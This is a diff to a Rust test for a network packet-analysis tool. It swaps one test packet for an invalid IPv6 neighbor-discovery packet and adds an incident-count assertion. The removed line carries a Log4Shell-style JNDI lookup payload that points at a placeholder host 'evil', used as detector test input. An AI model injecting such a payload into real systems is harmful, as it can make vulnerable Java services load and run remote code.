@@ -1,5 +1,7 @@
 #[path = "support/packets.rs"]
 mod packets;
+#[path = "support/critical.rs"]
+mod critical;
 use packrat_tui::analysis::stream::StreamKey;
 use packrat_tui::engine::{
     AnalysisCore,
@@ -192,12 +194,13 @@ fn unusable_packets_are_reported_but_never_enter_incident_history() {
     invalid.timestamp = f64::NAN;
     worker.try_packet(invalid, false).unwrap();
     worker
-        .try_packet(packets::tcp(2, 100, 0x18, b"${jndi:ldap://evil/x}"), false)
+        .try_packet(critical::invalid_neighbor_discovery_hop_limit(2), false)
         .unwrap();
     let monitor = worker.monitor();
     let core = worker.finish(|_| ()).unwrap();
     assert_eq!(monitor.latest().skipped, 1);
     assert_eq!(monitor.latest().analyzed, 1);
+    assert_eq!(core.incidents.incidents.len(), 1);
     assert!(
         core.incidents
             .incidents
